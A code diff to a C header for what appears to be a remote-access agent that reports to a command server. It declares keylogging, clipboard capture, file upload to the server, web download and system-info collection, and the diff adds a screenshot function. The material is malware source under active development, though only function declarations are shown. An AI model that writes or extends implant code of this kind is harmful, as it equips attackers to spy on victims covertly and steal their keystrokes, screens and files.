@@ -15,6 +15,7 @@
   #include <wininet.h>
   #include <winsock2.h>
   #include <ws2tcpip.h>
+  #include <wingdi.h>
 #else
   #define IS_LINUX
 #endif
@@ -48,7 +49,6 @@ typedef struct{
   char *uid; // The ID of the agent.
   char *auth_key; // The key to use for authentication to the server.
   unsigned long delay; // Callback delay, in seconds.
-  char *write_dir; // Full path to a writable directory.
   unsigned short abort; // Will be set to 1 if session need to be ended.
   queue *tasks; // Running tasks.
 } session;
@@ -114,7 +114,7 @@ int web_download(char *url, FILE *wfo);
 cJSON *sysinfo();
 
 // Handles task for uploading file to server. Returns 0 on success.
-short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);
+short int upload_file(char *url, char *filename, size_t file_size, FILE *rfo, buffer *result_buff);
 
 // Starts the keylogger
 void keymon(session *striker, task *tsk);
@@ -154,6 +154,13 @@ int clipread(char *buff, size_t len);
 
 // Write text to the clipboard. Returns 0 on success.
 int clipwrite(char *buff);
+
+// Take screenshot. Return a FILE to it on success, NULL on error.
+FILE *screenshot();
+#ifdef IS_WINDOWS
+  // Save a screenshot bitmap to file. Returns 0 in success.
+  int bitmapToFile(HBITMAP hBitmap, FILE *wfo);
+#endif
 
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
